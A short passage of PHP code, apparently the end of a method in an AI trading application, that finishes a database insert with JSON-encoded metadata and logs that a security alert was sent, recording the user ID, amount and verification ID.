            ':metadata' => json_encode($metadata, JSON_UNESCAPED_UNICODE)
        ]);

        Logger::info('AI Trader security alert sent', [
            'user_id' => $userId,
            'amount' => $amount,
            'verification_id' => $verificationId
        ]);
    }
}

